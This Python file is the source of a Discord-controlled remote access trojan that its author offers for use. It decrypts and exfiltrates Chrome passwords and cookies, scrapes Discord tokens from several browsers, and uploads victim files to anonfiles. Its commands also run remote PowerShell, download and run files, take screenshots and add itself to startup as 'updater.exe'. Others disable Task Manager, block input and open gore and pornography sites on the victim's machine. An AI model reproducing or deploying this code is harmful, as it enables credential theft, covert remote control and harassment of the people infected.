###############################################################
# Developed By veal / Remote Administration Trojan / CnC     #
#                       Detected = True                       # 
#                Grabs Cookies and token = True               #
#                     is your mom gay = True                  #
###############################################################

###############################################################
#                  https://discord.gg/zbdRW7ArD7              #
###############################################################
import os, discord, subprocess, requests, pyautogui, re, shutil, json,ctypes, sqlite3, win32crypt, base64
import datetime
import shutil
from Crypto.Cipher import AES
from ctypes import *



def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]



def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]



def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]



intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
token = "TOKENHERE"
guild_id = "SERVER_ID_HERE"
commands = "\n".join([
    "😈 !help - Help command", # help menu
    "😈 !killdc - Kills Discord Tree", # kills discord tree
    "😈 !killall - Kills all Crit Processes", # kills al crit processes
    "😈 !ping - Ping command", # pings bots MS / latency
    "😈 !0mgr - Disables Task Manager [ Requires Admin ]", #Perminantly disables Taassk manager
    "😈 !cd - Change directory", 
    "😈 !ls - List directory",
    "😈 !winspam - Spams Chrome",
    "😈 !cmdspam - Spams Command prompt",
    "😈 !download <file> - Download file",
    "😈 !upload <link> - Upload file",
    "😈 !shell - Execute shell command / !shell <command>", # rev shell
    "😈 !exit - Exit the session",
    "😈 !screenshot - Take a screenshot",
    "😈 !kekma - Opens a Gore Window in the Browser",
    "😈 !tokens - Get all discord tokens",
    "😈 !cookies - Get all Chrome Cookies",
    "😈 !cpass - Get all Chrome passwords",
    "😈 !startup - Add to startup",
    "😈 !shutdown - Shutdown the computer",
    "😈 !restart - Restart the computer",
])

# Commands Here

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="😈 Nexus Discord HnC RAT", description="", color=0xBA01FF)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/880119637935816754/1018120362090844170/2A697F9D-FB3B-4DC9-BB48-2B408A77C21E.gif")
    embed.add_field(name="Session ID", value=f"`{session_id}`", inline=True)
    embed.add_field(name="Username", value=f"`{os.getlogin()}`", inline=True)
    embed.add_field(name="😈  Network Information", value=f"`IP: {ip_address}`", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="😈  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="😈  Commands", value=f"```{commands}```", inline=False)
    embed.set_footer(icon_url="https://media.discordapp.net/attachments/880119637935816754/1018120362090844170/2A697F9D-FB3B-4DC9-BB48-2B408A77C21E.gif", text="github.com/veallol")
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "!help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content == "!ping":
        embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content.startswith("!cd"):
        directory = message.content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xBA01FF)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content == "!ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xBA01FF)
        await message.reply(embed=embed)


    if message.content == "!cpass":
        def chrometime(ch) ->str:
            return str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ch))
            
        def encryption_key():
            localsp = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
            with open(localsp, "r", encoding="utf-8") as f:
                ls = f.read()
                ls = json.loads(ls)
                
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        def decrypt_password(pw, key) -> str:
            try:
                iv = pw[3:15]
                password = pw[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""
                    
        def main():
            temp = os.getenv("TEMP")
            pwpath = f"{temp}\\{os.getlogin()}-GooglePasswords.txt"
            if os.path.exists(pwpath):
                os.remove(pwpath)
            with open(pwpath, "a")as ddd:
                key = encryption_key()
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "default", "Login Data")
                filename = f"{temp}\\ChromeData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = decrypt_password(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]        
                    if username or password:
                        ddd.write(f"Origion URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {str(chrometime(date_last_used))}\nDate Created: {str(chrometime(date_created))}\n")
                    else:
                        continue
                cursor.close()
                db.close()
                try:
                    os.remove(filename)
                except:
                    pass
                    
        main()
        
        temp = os.getenv("TEMP")
        
        file = discord.File(f"{temp}\\{os.getlogin()}-GooglePasswords.txt", f"{os.getlogin()}-GooglePass.txt")
        await message.reply(f"{os.getlogin()}'s Google Passwords:\n", file=file)



    if message.content == "!cookies":
            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
            
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                
            def decrypt_data(data, key) -> str:
                try:
                    iv = data[3:15]
                    data = data[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(data)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                    except:
                        return ""
                        
            def main():
                temp = os.getenv("TEMP")
                cookiespath = f"{temp}\\{os.getlogin()}-GoogleCookies.txt"
                if os.path.exists(cookiespath):
                    os.remove(cookiespath)
                with open(cookiespath, "a")as cookie:
                    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
                    filename = f"{temp}\\Cookies.db"
                    if not os.path.isfile(filename):
                        shutil.copyfile(db_path, filename)
                    db = sqlite3.connect(filename)
                    db.text_factory = lambda b: b.decode(errors="ignore")
                    cursor = db.cursor()
                    cursor.execute("""
                    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
                    FROM cookies""")
                    key = get_encryption_key()
                    for host_key, name, value, creation_utc, last_accesses_utc, expires_utc, encrypted_value,  in cursor.fetchall():
                        if not value:
                            decrypted_value = decrypt_data(encrypted_value, key)
                        else:
                            decrypted_value = value
                        cursor.execute("""
                        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                        WHERE host_key = ?
                        AND name = ?""", (decrypted_value, host_key, name))
                        cookie.write(f"{host_key}   {decrypted_value}\n")
                    db.commit()
                    db.close()
                    try:
                        os.remove(filename)
                    except:
                        pass
                    
            main()
            
            temp = os.getenv("TEMP")
            
            file = discord.File(f"{temp}\\{os.getlogin()}-GoogleCookies.txt", f"{os.getlogin()}-GoogleCookies.txt")
            await message.reply(f"{os.getlogin()}'s Google Cookies:\n", file=file)



    if message.content.startswith("!download"):
        file = message.content.split(" ")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"{link}", color=0xBA01FF)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File not found```", color=0xBA01FF)
            await message.reply(embed=embed)

    if message.content.startswith("!upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content.startswith("!shell"):
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content.startswith("!run"):
        file = message.content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xBA01FF)
        await message.reply(embed=embed)


    if message.content == "!killall":
        os.system("taskkill /IM explorer.exe")
        os.system("taskkill /IM chrome.exe")
        os.system("taskkill /IM discord.exe")
        embed = discord.Embed(title="Killed The Following Processes", description=f"```Chrome, explorer, discord```", color=0xBA01FF)
        await message.reply(embed=embed)
        


    
    if message.content == "!blockin":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                embed = discord.Embed(title="Blocked Input", description=f"```Succesfully Blocked User Input```", color=0xBA01FF)
                await message.reply(embed=embed)
            else:
                embed = discord.Embed(title="Error", description=f"```Failed To Block User Input```", color=0xBA01FF)
                await message.reply(embed=embed)
    
    if message.content == "!unblockin":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ok = windll.user32.BlockInput(False)
            embed = discord.Embed(title="Unblocked Input", description=f"```Succesfully Unblocked User Input```", color=0xBA01FF)
            await message.reply(embed=embed)
        else:
            embed = discord.Embed(title="Error", description=f"```Failed To Unblock User Input```", color=0xBA01FF)
            await message.reply(embed=embed)

    if message.content == "!exit":
        await message.channel.delete()
        await bot.close()

    if message.content == "!screenshot":
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xBA01FF)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)
    

    if message.content == "!tokens":
        paths = [
            os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
        ]
        tokens = []
        for path in paths:
            if not os.path.exists(path):
                continue
            
            for file in os.listdir(path):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue

                for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]:
                    for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
                        for token in re.findall(regex, line):
                            tokens.append(token)
                            
        tokens = "\n".join(tokens)
        if tokens == "":
            tokens = "No tokens found"
        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content == "!startup":
        path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        try:
            shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "updater.exe"))
            embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'updater.exe')}```", color=0xBA01FF)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xBA01FF)
            await message.reply(embed=embed)
    

    if message.content == "!winspam":
        try:
            while True:
                os.startfile("chrome.exe")
                embed = discord.Embed(title="!winspam", description=f"```Succesfully Spamming Chrome.exe```", color=0xBA01FF)
                await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```Failed to Spam Chrome.exe```", color=0xBA01FF)
            await message.reply(embed=embed)
            
    if message.content == "!cmdspam":
        try:
            while True:
                os.startfile("cmd.exe")
                embed = discord.Embed(title="!cmdspam", description=f"```Succesfully Spamming CMD Windows```", color=0xBA01FF)
                await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```Failed to Spam CMD windows```", color=0xBA01FF)
            await message.reply(embed=embed)

    if message.content == "!0mgr":
        try:
            os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
            embed = discord.Embed(title="!0mgr", description=f"```Succesfully Disabled Task Manger```", color=0xBA01FF)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```Unable to Disabled Task Manger Target Needs to run in Admin```", color=0xBA01FF)
            await message.reply(embed=embed)

    if message.content == "!killdc":
        os.system("taskkill /IM discord.exe")
        embed = discord.Embed(title="Killed Discord", description=f"```Succesfully Killed Discord```", color=0xBA01FF)
        await message.reply(embed=embed)


    if message.conten == "!1mgr":
        os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
        embed = discord.Embed(title="!0mgr", description=f"```Succesfully Enabled Task Manger```", color=0xBA01FF)
        await message.reply(embed=embed)
    else:
        embed = discord.Embed(title="Error", description=f"```Unable to Enable Task Manger Target Needs to run in Admin```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content == "!kekma":
        os.startfile("chrome.exe https://kekma.net/")
        embed = discord.Embed(title="KEKMA", description=f"```Opend Up https://kekma.net/ In thier browser```", color=0xBA01FF)
        await message.reply(embed=embed)
    else:
        embed = discord.Embed(title="Error", description=f"```Unable to Open https://kekma.net/ in victims browser```", color=0xBA01FF)
        await message.reply(embed=embed)

    if message.content == "!porn":
        while True:
            os.startfile("https://www.pornhub.com/view_video.php?viewkey=ph6393ac3ec99a8")
            embed = discord.Embed(title="!porn", description="```Successfully opening Gay Porn Windows On victims PC```")
            await message.reply(embed=embed)
        else:
            embed = discord.Embed(title="Error", description=f"```Unable to Open https://kekma.net/ in victims browser```", color=0xBA01FF)
            await message.reply(embed=embed)


    if message.content == "!shutdown":
        await message.channel.delete()
        await bot.close()
        os.system("shutdown /s /t 0")



    if message.content == "!restart":
        await message.channel.delete()
        await bot.close()
        os.system("shutdown /r /t 0")



bot.run(token, log_handler=None)

